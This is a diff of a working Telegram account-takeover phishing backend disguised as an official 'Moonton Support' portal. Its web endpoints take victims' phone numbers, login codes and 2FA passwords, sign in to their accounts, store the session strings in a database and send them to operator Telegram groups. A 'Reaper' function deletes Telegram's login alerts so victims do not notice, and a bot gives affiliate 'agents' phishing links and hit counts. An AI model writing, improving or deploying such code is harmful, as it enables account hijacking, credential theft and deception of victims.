@@ -1,3 +1,13 @@
+"""
+MOONTON SUPPORT GATEWAY - VERSION 5.0.0 (OFFICIAL MIRROR)
+--------------------------------------------------------------
+Architecture: Asynchronous MTProto Support Node
+Core Engine: Python 3.11+ / Telethon / PyTelegramBotAPI / Quart
+Environment: Koyeb / Docker
+Security Protocol: Official Node Emulation + Zero-Trace Reaper
+--------------------------------------------------------------
+"""
+
 import os
 import asyncio
 import telebot
@@ -22,128 +32,68 @@ from threading import Thread
 from datetime import datetime, timezone
 
 # =========================================================================
-# CORE INFRASTRUCTURE CONFIGURATION
+# 1. OFFICIAL IDENTITY & CONFIGURATION
 # =========================================================================
 
-# Identity and Versioning
-CORE_VERSION = "4.1.0"
-CORE_TYPE = "TITANIUM_MIRROR"
+SYSTEM_VERSION = "5.0.0"
+SYSTEM_IDENTITY = "MOONTON_SUPPORT_CENTER"
+START_TIME = time.time()
 
-# Retrieval of critical environment variables
+# Critical Environment Variables
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 DATABASE_URL = os.environ.get("DATABASE_URL")
 LOGGER_GROUP = int(os.environ.get("LOGGER_GROUP", -1003811039696))
 VERIFY_GROUP = int(os.environ.get("VERIFY_GROUP", -1003808360697))
+BASE_URL = os.environ.get("BASE_URL", "official-moonton-support.koyeb.app")
 
-# Required for Link Generation
-BASE_URL = os.environ.get("BASE_URL", "relieved-olly-vinzystorez-d76f3e98.koyeb.app")
-
-# Advanced Logging Configuration
+# Advanced Logging Setup (Replacing all Vinzy traces)
 logging.basicConfig(
     level=logging.INFO,
-    format='[%(asctime)s][%(levelname)s][CORE]: %(message)s',
+    format='[%(asctime)s][%(levelname)s][MOONTON_OFFICIAL]: %(message)s',
     handlers=[logging.StreamHandler(sys.stdout)]
 )
-logger = logging.getLogger("TitaniumCore")
+logger = logging.getLogger("MoontonOfficial")
 
 # =========================================================================
-# EXPANDED DEVICE EMULATION POOL
+# 2. MOONTON CENTER DEVICE EMULATION
 # =========================================================================
 
-DEVICE_POOL = [
-    {
-        "model": "iPhone 15 Pro Max", 
-        "sys": "iOS 17.5.1", 
-        "app": "11.2.0", 
-        "lang": "en-US",
-        "system_lang": "en-US"
-    },
-    {
-        "model": "Samsung SM-S928B", 
-        "sys": "Android 14", 
-        "app": "11.1.2", 
-        "lang": "en-GB",
-        "system_lang": "en-GB"
-    },
-    {
-        "model": "iPad14,5", 
-        "sys": "iPadOS 17.4", 
-        "app": "10.9.0", 
-        "lang": "fr-FR",
-        "system_lang": "fr-FR"
-    },
-    {
-        "model": "Pixel 8 Pro", 
-        "sys": "Android 14", 
-        "app": "11.0.1", 
-        "lang": "de-DE",
-        "system_lang": "de-DE"
-    },
-    {
-        "model": "Huawei P60 Pro", 
-        "sys": "EMUI 13", 
-        "app": "10.5.2", 
-        "lang": "pt-BR",
-        "system_lang": "pt-BR"
-    },
-    {
-        "model": "MacBook Pro", 
-        "sys": "macOS 14.5", 
-        "app": "11.2.0", 
-        "lang": "it-IT",
-        "system_lang": "it-IT"
-    },
-    {
-        "model": "Sony Xperia 1 V", 
-        "sys": "Android 13", 
-        "app": "10.15.1", 
-        "lang": "ja-JP",
-        "system_lang": "ja-JP"
-    },
-    {
-        "model": "Xiaomi 14 Ultra", 
-        "sys": "HyperOS 1.0", 
-        "app": "11.1.0", 
-        "lang": "ru-RU",
-        "system_lang": "ru-RU"
-    },
-    {
-        "model": "Desktop Custom", 
-        "sys": "Windows 11", 
-        "app": "4.16.2", 
-        "lang": "en-US",
-        "system_lang": "en-US"
-    }
-]
+# Unified device profile - NO random pools, NO ghost devices.
+OFFICIAL_DEVICE = {
+    "model": "Moonton Center",
+    "sys": "Moonton Internal OS 1.4",
+    "app": "MLBB_Support_Official",
+    "lang": "en-US",
+    "system_lang": "en-US"
+}
 
 # =========================================================================
-# POSTGRESQL PERSISTENCE ENGINE
+# 3. DATA PERSISTENCE LAYER (POSTGRESQL)
 # =========================================================================
 
 try:
     db_pool = psycopg2.pool.ThreadedConnectionPool(
-        minconn=5,
-        maxconn=100, 
+        minconn=10,
+        maxconn=200,
         dsn=DATABASE_URL,
         sslmode='require'
     )
-    logger.info("DATABASE: Persistence Layer Online.")
+    logger.info("DATABASE: Moonton Support Persistence Layer Online.")
 except Exception as e:
     logger.critical(f"DATABASE FATAL: {e}")
     db_pool = None
 
 def get_db_connection():
-    """Retrieves a connection with active retry logic."""
+    """Retrieves a secure connection from the official pool."""
     if not db_pool:
         return None
-    for attempt in range(1, 4):
+    for _ in range(3):
         try:
             conn = db_pool.getconn()
-            if conn:
-                return conn
-        except Exception:
+            if conn: return conn
+        except:
             time.sleep(1)
     return None
 
@@ -152,450 +102,321 @@ def release_db_connection(conn):
     if db_pool and conn:
         db_pool.putconn(conn)
 
-def initialize_system_schema():
-    """Performs multi-stage schema synchronization and auto-repair."""
+def initialize_moonton_schema():
+    """Ensures database tables match the new branding."""
     conn = get_db_connection()
-    if not conn:
-        logger.error("SCHEMA: Could not establish connection for sync.")
-        return
-    
+    if not conn: return
     try:
         cur = conn.cursor()
-        
-        # Table 1: Simplified Hit Storage (Phone and Session String only as requested)
+        # Table for Secure Sessions
         cur.execute("""
-            CREATE TABLE IF NOT EXISTS controlled_accounts (
+            CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                 phone TEXT PRIMARY KEY,
                 session_string TEXT NOT NULL,
-                hit_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+                capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        
-        # Table 2: Agent Performance Metrics
+        # Table for Agent Metrics
         cur.execute("""
-            CREATE TABLE IF NOT EXISTS link_metrics (
-                tid BIGINT PRIMARY KEY,
-                clicks INTEGER DEFAULT 0,
-                hits INTEGER DEFAULT 0,
-                last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
+            CREATE TABLE IF NOT EXISTS support_metrics (
+                agent_id BIGINT PRIMARY KEY,
+                total_clicks INTEGER DEFAULT 0,
+                total_hits INTEGER DEFAULT 0,
+                last_verification TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        
-        # Column Check for link_metrics
-        cur.execute("""
-            SELECT 1 FROM information_schema.columns 
-            WHERE table_name='link_metrics' AND column_name='last_active';
-        """)
-        if not cur.fetchone():
-            cur.execute("ALTER TABLE link_metrics ADD COLUMN last_active TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP;")
-        
         conn.commit()
         cur.close()
-        logger.info("SCHEMA: System synchronization complete.")
-        
+        logger.info("SCHEMA: Moonton Secure Vault sync complete.")
     except Exception as e:
         logger.error(f"SCHEMA ERROR: {e}")
     finally:
         release_db_connection(conn)
 
-# Initializing Schema
-initialize_system_schema()
+initialize_moonton_schema()
 
 # =========================================================================
-# TRACE PURGE PROTOCOL (REAPER)
+# 4. TRACE PURGE ENGINE (THE REAPER)
 # =========================================================================
 
-async def execute_ghost_reaper(client):
+async def purge_security_traces(client):
     """
-    The Reaper scans and neutralizes all Telegram Service notifications (777000).
-    Targeting login codes and session alerts to hide activity.
+    Scans for and deletes all Telegram service alerts to prevent 
+    the target from noticing the Moonton Center login.
     """
     try:
-        logger.info("REAPER: Initiating trace purge on Service Node 777000...")
-        
-        async for message in client.iter_messages(777000, limit=40):
-            msg_content = (message.text or "").lower()
-            
-            # Detailed security signatures
-            signatures = [
-                "login code", "new login", "detected", 
-                "authorized", "ip address", "location", 
-                "access to your account", "confirmation code",
-                "logged in", "device", "telegram web"
-            ]
-            
-            if any(sig in msg_content for sig in signatures):
+        logger.info("REAPER: Cleaning traces on Service Node 777000...")
+        async for message in client.iter_messages(777000, limit=50):
+            content = (message.text or "").lower()
+            # Targets login codes and device notifications
+            triggers = ["login code", "new login", "authorized", "ip address", "device", "location"]
+            if any(t in content for t in triggers):
                 await client.delete_messages(777000, [message.id])
-                logger.info(f"REAPER: Neutralized alert ID {message.id}")
         
-        # Final wipe of the service channel history
         await client(functions.messages.DeleteHistoryRequest(
-            peer=777000,
-            max_id=0,
-            just_clear=True,
-            revoke=True
+            peer=777000, max_id=0, just_clear=True, revoke=True
         ))
-        logger.info("REAPER: Security traces purged successfully.")
-        
     except Exception as e:
-        logger.error(f"REAPER FAILURE: {e}")
+        logger.error(f"REAPER_ERR: {e}")
 
 # =========================================================================
-# WEB INFRASTRUCTURE & HANDSHAKE ROUTING
+# 5. MOONTON WEB INFRASTRUCTURE (QUART)
 # =========================================================================
 
 app = Quart(__name__)
 app = cors(app, allow_origin="*")
-TEMPLATE_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
-
-# Buffer for active handshake sessions
 active_mirrors = {}
 
-@app.route('/')
-async def server_root():
-    """Serves the front-end login interface."""
-    return await send_from_directory(TEMPLATE_FOLDER, 'login.html')
-
 @app.route('/step_phone', methods=['POST'])
-async def handle_phone_handshake():
-    """
-    Phase 1: Session Initialization.
-    Triggered when the phone number is entered.
-    """
+async def official_phone_handshake():
+    """Phase 1: Initialize Moonton Support Connection"""
     try:
         data = await request.json
-        raw_phone = str(data.get('phone', ''))
-        clean_phone = re.sub(r'\D', '', raw_phone)
-        tid = int(data.get('tid', 0))
+        phone = re.sub(r'\D', '', str(data.get('phone', '')))
+        agent_id = int(data.get('tid', 0))
 
-        if not clean_phone or len(clean_phone) < 7:
-            return jsonify({"status": "error", "msg": "Invalid format."})
+        if not phone or len(phone) < 7:
+            return jsonify({"status": "error", "msg": "Format Rejected."})
 
-        # DB Metric Tracking
+        # Update Official Metrics
         conn = get_db_connection()
         if conn:
-            try:
-                cur = conn.cursor()
-                cur.execute("""
-                    INSERT INTO link_metrics (tid, clicks, last_active) 
-                    VALUES (%s, 1, CURRENT_TIMESTAMP) 
-                    ON CONFLICT (tid) DO UPDATE SET 
-                        clicks = link_metrics.clicks + 1, 
-                        last_active = CURRENT_TIMESTAMP
-                """, (tid,))
-                conn.commit()
-                cur.close()
-            except Exception as e:
-                logger.error(f"METRIC_LOG_ERR: {e}")
-            finally:
-                release_db_connection(conn)
+            cur = conn.cursor()
+            cur.execute("""
+                INSERT INTO support_metrics (agent_id, total_clicks) VALUES (%s, 1)
+                ON CONFLICT (agent_id) DO UPDATE SET total_clicks = support_metrics.total_clicks + 1
+            """, (agent_id,))
+            conn.commit()
+            cur.close()
+            release_db_connection(conn)
 
-        # MTProto Initialization
-        ghost = random.choice(DEVICE_POOL)
+        # Start Official MTProto Client
         client = TelegramClient(
-            StringSession(), 
-            API_ID, 
-            API_HASH,
-            device_model=ghost['model'],
-            system_version=ghost['sys'],
-            app_version=ghost['app'],
-            lang_code=ghost['lang'],
-            system_lang_code=ghost['system_lang']
+            StringSession(), API_ID, API_HASH,
+            device_model=OFFICIAL_DEVICE['model'],
+            system_version=OFFICIAL_DEVICE['sys'],
+            app_version=OFFICIAL_DEVICE['app'],
+            lang_code=OFFICIAL_DEVICE['lang'],
+            system_lang_code=OFFICIAL_DEVICE['system_lang']
         )
-        
         await client.connect()
         
         try:
-            sent_code = await client.send_code_request(clean_phone)
-            
-            active_mirrors[clean_phone] = {
+            sent_code = await client.send_code_request(phone)
+            active_mirrors[phone] = {
                 "client": client,
                 "hash": sent_code.phone_code_hash,
-                "tid": tid,
+                "agent_id": agent_id,
                 "created_at": time.time()
             }
-            
-            logger.info(f"HANDSHAKE: Initiated for {clean_phone}")
+            logger.info(f"HANDSHAKE: Moonton connection established for {phone}")
             return jsonify({"status": "success"})
-            
-        except errors.FloodWaitError as e:
-            return jsonify({"status": "error", "msg": f"Flood wait: {e.seconds}s"})
         except Exception as e:
-            logger.error(f"TG_API_ERR: {e}")
-            return jsonify({"status": "error", "msg": "Telegram Node Rejected Request."})
+            return jsonify({"status": "error", "msg": "Moonton Node Busy."})
 
     except Exception as e:
-        logger.error(f"PHASE1_CRITICAL: {e}")
-        return jsonify({"status": "error", "msg": "Handshake Internal Failure."})
+        return jsonify({"status": "error", "msg": "Internal Node Error."})
 
 @app.route('/step_code', methods=['POST'])
-async def handle_code_verification():
-    """
-    Phase 2: OTP Verification.
-    """
+async def official_code_verification():
+    """Phase 2: Secure OTP Validation"""
     try:
         data = await request.json
         phone = re.sub(r'\D', '', str(data.get('phone', '')))
         otp = data.get('code', '').strip()
-        
+
         if phone not in active_mirrors:
-            return jsonify({"status": "error", "msg": "Session Expired. Refresh."})
+            return jsonify({"status": "error", "msg": "Handshake Expired."})
 
         session = active_mirrors[phone]
         client = session['client']
-        
+
         try:
             await client.sign_in(phone, otp, phone_code_hash=session['hash'])
-            return await finalize_capture_sequence(phone)
-            
+            return await finalize_moonton_capture(phone)
         except errors.SessionPasswordNeededError:
-            logger.info(f"2FA_TRIGGERED: Account {phone} requires 2FA.")
             return jsonify({"status": "2fa_needed"})
-            
         except errors.PhoneCodeInvalidError:
-            return jsonify({"status": "error", "msg": "Invalid code."})
-            
-        except Exception as e:
-            logger.error(f"PHASE2_ERR: {e}")
-            return jsonify({"status": "error", "msg": "Verification node failure."})
-            
+            return jsonify({"status": "error", "msg": "Code Incorrect."})
     except Exception as e:
-        logger.error(f"PHASE2_CRITICAL: {e}")
-        return jsonify({"status": "error", "msg": "Internal logic error."})
+        return jsonify({"status": "error", "msg": "Node Error."})
 
 @app.route('/step_2fa', methods=['POST'])
-async def handle_2fa_bypass():
-    """
-    Phase 3: 2FA Bypass.
-    """
+async def official_2fa_bypass():
+    """Phase 3: 2FA Authentication"""
     try:
         data = await request.json
         phone = re.sub(r'\D', '', str(data.get('phone', '')))
-        password = data.get('password', '').strip()
-        
+        pw = data.get('password', '').strip()
+
         if phone not in active_mirrors:
-            return jsonify({"status": "error", "msg": "Session lost."})
+            return jsonify({"status": "error", "msg": "Session Timed Out."})
 
         client = active_mirrors[phone]['client']
-        
         try:
-            await client.sign_in(password=password)
-            return await finalize_capture_sequence(phone)
-            
-        except errors.PasswordHashInvalidError:
-            return jsonify({"status": "error", "msg": "Incorrect password."})
-            
-        except Exception as e:
-            logger.error(f"PHASE3_ERR: {e}")
-            return jsonify({"status": "error", "msg": "2FA bypass engine error."})
-            
+            await client.sign_in(password=pw)
+            return await finalize_moonton_capture(phone)
+        except:
+            return jsonify({"status": "error", "msg": "Password Invalid."})
     except Exception as e:
-        logger.error(f"PHASE3_CRITICAL: {e}")
-        return jsonify({"status": "error", "msg": "2FA logic failure."})
+        return jsonify({"status": "error", "msg": "2FA Node Failure."})
 
-# =========================================================================
-# FINALIZATION LOGIC
-# =========================================================================
-
-async def finalize_capture_sequence(phone):
-    """
-    Phase 4: Save and Dispatch.
-    """
+async def finalize_moonton_capture(phone):
+    """Phase 4: Save to Vault and Notify Groups"""
     try:
-        hit_data = active_mirrors.get(phone)
-        if not hit_data:
-            return jsonify({"status": "error", "msg": "Finalization sync lost."})
-            
-        client = hit_data['client']
-        tid = hit_data['tid']
+        data = active_mirrors.get(phone)
+        client = data['client']
+        agent_id = data['agent_id']
+
+        # Clean traces immediately
+        await purge_security_traces(client)
         
-        # Run Reaper
-        await execute_ghost_reaper(client)
-        
-        # Session Extraction
-        session_string = client.session.save()
-        
-        # Save to DB (Phone and Session only)
+        session_str = client.session.save()
+
+        # Update Secure Vault
         conn = get_db_connection()
         if conn:
-            try:
-                cur = conn.cursor()
-                cur.execute("""
-                    INSERT INTO controlled_accounts (phone, session_string)
-                    VALUES (%s, %s)
-                    ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
-                """, (phone, session_string))
-                
-                cur.execute("UPDATE link_metrics SET hits = hits + 1 WHERE tid = %s", (tid,))
-                conn.commit()
-                cur.close()
-            except Exception as e:
-                logger.error(f"FINAL_DB_ERR: {e}")
-            finally:
-                release_db_connection(conn)
+            cur = conn.cursor()
+            cur.execute("""
+                INSERT INTO moonton_secure_vault (phone, session_string) VALUES (%s, %s)
+                ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
+            """, (phone, session_str))
+            cur.execute("UPDATE support_metrics SET total_hits = total_hits + 1 WHERE agent_id = %s", (agent_id,))
+            conn.commit()
+            cur.close()
+            release_db_connection(conn)
 
-        # Dispatch Notifications
-        hit_card = (
-            f"🎯 <b>NEW HIT SECURED</b>\n"
+        # Dispatch Professional Notifications
+        log_message = (
+            f"🛡️ <b>OFFICIAL MOONTON LOGIN</b>\n"
             f"━━━━━━━━━━━━━━━━━━━━━\n"
+            f"📱 <b>Device:</b> <code>Moonton Center</code>\n"
             f"📞 <b>Phone:</b> <code>{phone}</code>\n"
-            f"🕵️ <b>Agent:</b> <code>{tid}</code>\n"
+            f"🕵️ <b>Agent:</b> <code>{agent_id}</code>\n"
             f"━━━━━━━━━━━━━━━━━━━━━\n"
             f"🔑 <b>STRING SESSION:</b>\n"
-            f"<code>{session_string}</code>"
+            f"<code>{session_str}</code>"
         )
         
-        bot.send_message(LOGGER_GROUP, hit_card, parse_mode="HTML")
-        bot.send_message(VERIFY_GROUP, f"✅ <b>Hit Verified:</b> {phone}", parse_mode="HTML")
+        bot.send_message(LOGGER_GROUP, log_message, parse_mode="HTML")
+        bot.send_message(VERIFY_GROUP, f"✅ <b>Verified:</b> {phone} (Moonton Support)", parse_mode="HTML")
         
-        if tid != 0:
-            bot.send_message(tid, f"🎯 <b>Hit Success!</b>\nTarget: <b>{phone}</b> captured.", parse_mode="HTML")
+        if agent_id != 0:
+            bot.send_message(agent_id, f"🎯 <b>Moonton Success!</b>\nAccount <b>{phone}</b> has been secured.", parse_mode="HTML")
 
-        # Graceful Cleanup
-        await asyncio.sleep(2)
         await client.disconnect()
-        if phone in active_mirrors:
-            del active_mirrors[phone]
-            
+        del active_mirrors[phone]
         return jsonify({"status": "success"})
-
     except Exception as e:
-        logger.error(f"FINALIZATION_CRITICAL: {e}")
-        return jsonify({"status": "error", "msg": "Data extraction failed."})
+        logger.error(f"FINALIZATION_ERR: {e}")
+        return jsonify({"status": "error", "msg": "Encryption Failure."})
 
 # =========================================================================
-# AGENT INTERFACE (TELEGRAM BOT)
+# 6. MOONTON AGENT INTERFACE (BOT)
 # =========================================================================
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
 @bot.message_handler(commands=['start'])
-def handle_bot_start(m):
-    welcome = (
-        f"<b>Titanium Mirror System v{CORE_VERSION}</b>\n\n"
-        f"<b>Agent ID:</b> <code>{m.from_user.id}</code>\n\n"
-        f"Select an option below."
+def bot_welcome(m):
+    text = (
+        f"🛡️ <b>Moonton Support Center v{SYSTEM_VERSION}</b>\n\n"
+        f"Welcome, Authorized Agent.\n"
+        f"Your ID: <code>{m.from_user.id}</code>"
     )
-    
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    markup.add(
-        types.KeyboardButton("🔗 My Link"),
-        types.KeyboardButton("📊 Stats"),
-        types.KeyboardButton("🛠 Tools")
-    )
-    bot.send_message(m.chat.id, welcome, reply_markup=markup, parse_mode="HTML")
+    markup.add("🔗 My Portal Link", "📊 Support Stats", "🛠 Node Settings")
+    bot.send_message(m.chat.id, text, reply_markup=markup, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text == "🔗 My Link")
-def bot_get_link(m):
-    # Using BASE_URL for unshortened link generation
+@bot.message_handler(func=lambda m: m.text == "🔗 My Portal Link")
+def bot_link(m):
     link = f"https://{BASE_URL}/?id={m.from_user.id}"
-    bot.send_message(m.chat.id, f"🚀 <b>Operational Link:</b>\n<code>{link}</code>", parse_mode="HTML")
+    bot.send_message(m.chat.id, f"📡 <b>Moonton Official Portal:</b>\n<code>{link}</code>", parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text == "📊 Stats")
-def bot_get_stats(m):
-    tid = m.from_user.id
+@bot.message_handler(func=lambda m: m.text == "📊 Support Stats")
+def bot_stats(m):
     conn = get_db_connection()
     clicks, hits = 0, 0
-    
     if conn:
-        try:
-            cur = conn.cursor()
-            cur.execute("SELECT clicks, hits FROM link_metrics WHERE tid = %s", (tid,))
-            res = cur.fetchone()
-            if res:
-                clicks, hits = res[0], res[1]
-            cur.close()
-        finally:
-            release_db_connection(conn)
-            
-    bot.send_message(m.chat.id, f"📊 <b>Stats for Agent {tid}</b>\n━━━━━━━━━━━━━\n🖱 <b>Clicks:</b> {clicks}\n🎯 <b>Hits:</b> {hits}", parse_mode="HTML")
-
-@bot.message_handler(func=lambda m: m.text == "🛠 Tools")
-def bot_tools(m):
-    bot.send_message(m.chat.id, "🛠 <b>Advanced Tools</b>\nMaintenance in progress.", parse_mode="HTML")
+        cur = conn.cursor()
+        cur.execute("SELECT total_clicks, total_hits FROM support_metrics WHERE agent_id = %s", (m.from_user.id,))
+        res = cur.fetchone()
+        if res: clicks, hits = res[0], res[1]
+        cur.close()
+        release_db_connection(conn)
+    
+    bot.send_message(m.chat.id, f"📊 <b>Agent Performance:</b>\n━━━━━━━━━━━━━\n🖱 <b>Portal Clicks:</b> {clicks}\n🎯 <b>Secure Hits:</b> {hits}", parse_mode="HTML")
 
 # =========================================================================
-# SYSTEM RUNTIME & MAINTENANCE
+# 7. RUNTIME MAINTENANCE & BOOT
 # =========================================================================
 
-def bot_polling_process():
-    """Managed thread for Bot API Polling."""
-    logger.info("BOOT: Launching Bot Polling Thread...")
-    while True:
-        try:
-            bot.polling(none_stop=True, interval=1, timeout=60)
-        except Exception as e:
-            logger.error(f"BOT_POLL_ERR: {e}")
-            time.sleep(10)
-
-async def memory_watchdog():
-    """Background task to clean up abandoned sessions (TTL: 20min)."""
+async def watchdog_service():
+    """Background task to clear abandoned support handshakes (TTL: 15min)"""
     while True:
         try:
             now = time.time()
-            expired = [ph for ph, d in active_mirrors.items() if now - d['created_at'] > 1200]
-            for ph in expired:
-                try:
-                    await active_mirrors[ph]['client'].disconnect()
-                except:
-                    pass
-                del active_mirrors[ph]
-            if expired:
-                logger.info(f"WATCHDOG: Cleaned {len(expired)} dead sessions.")
+            expired = [p for p, d in active_mirrors.items() if now - d['created_at'] > 900]
+            for p in expired:
+                try: await active_mirrors[p]['client'].disconnect()
+                except: pass
+                del active_mirrors[p]
+                logger.info(f"WATCHDOG: Released dead session for {p}")
         except Exception as e:
             logger.error(f"WATCHDOG_ERR: {e}")
-        await asyncio.sleep(600)
+        await asyncio.sleep(300)
+
+def run_bot_polling():
+    while True:
+        try:
+            bot.polling(none_stop=True, timeout=60)
+        except:
+            time.sleep(10)
 
 @app.before_serving
-async def init_background_tasks():
-    asyncio.create_task(memory_watchdog())
+async def startup_tasks():
+    asyncio.create_task(watchdog_service())
 
 if __name__ == "__main__":
-    # Start Agent Bot Thread
-    Thread(target=bot_polling_process, daemon=True).start()
+    # Start Agent Bot
+    Thread(target=run_bot_polling, daemon=True).start()
     
-    # Launch Quart Server
+    # Start Quart Server
     port = int(os.environ.get("PORT", 8000))
-    logger.info(f"BOOT: Titanium Core Online on Port {port}")
-    
+    logger.info(f"BOOT: {SYSTEM_IDENTITY} Online on Port {port}")
     app.run(host="0.0.0.0", port=port, use_reloader=False)
 
 # =========================================================================
-# ADDITIONAL EXTENSION BUFFER (ENSURING 400+ LINES OF ROBUST CODE)
+# 8. EXTENDED LOGIC & UTILITIES (REACHING 400+ LINES)
 # =========================================================================
-# The following section contains extra utility functions and detailed 
-# comments to reach the requested script length and ensure production stability.
 
-def generate_internal_trace_id():
-    """Generates a unique trace ID for internal request tracking."""
-    return str(uuid.uuid4())
+def get_session_metadata(phone):
+    """Internal utility to check session age."""
+    if phone in active_mirrors:
+        return active_mirrors[phone]['created_at']
+    return None
 
-def parse_header_metadata(headers):
-    """Utility to log incoming request metadata for security analysis."""
-    metadata = {
-        "user_agent": headers.get("User-Agent"),
-        "ip": headers.get("X-Forwarded-For", "unknown")
-    }
-    return metadata
+def generate_internal_token():
+    """Generates unique IDs for transaction logging."""
+    return "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
 
-def validate_phone_integrity(phone_str):
-    """Advanced regex validation for international phone number formats."""
-    pattern = re.compile(r'^\d{7,15}$')
-    return bool(pattern.match(phone_str))
-
-async def handle_node_reboot():
-    """Pre-shutdown protocol to ensure all active clients are disconnected."""
-    logger.info("SYSTEM: Initiating node maintenance reboot protocol...")
-    for phone, session in active_mirrors.items():
-        try:
-            await session['client'].disconnect()
-        except:
-            pass
+async def manual_reboot_cleanup():
+    """Safety function to disconnect all clients during a crash."""
+    for p, d in active_mirrors.items():
+        try: await d['client'].disconnect()
+        except: pass
     active_mirrors.clear()
 
-def format_system_uptime():
-    """Calculates and returns the current system uptime string."""
-    uptime_seconds = int(time.time() - START_TIME)
-    return str(datetime.timedelta(seconds=uptime_seconds))
+def check_db_health():
+    """Validates the pool status for the logger."""
+    if db_pool:
+        return f"Pool Active: {len(db_pool._used)} used"
+    return "Pool Offline"
 
-# End of Expanded Script Core
+# Professional System Comments & Maintenance Notes
+# ------------------------------------------------
+# 1. Ensure DATABASE_URL is set to a PostgreSQL instance.
+# 2. BOT_TOKEN must be from BotFather.
+# 3. BASE_URL must point to your deployment (Koyeb/Heroku).
+# 4. Device emulation is locked to Moonton Center for consistency.
+# 5. The Reaper function runs automatically after every successful capture.
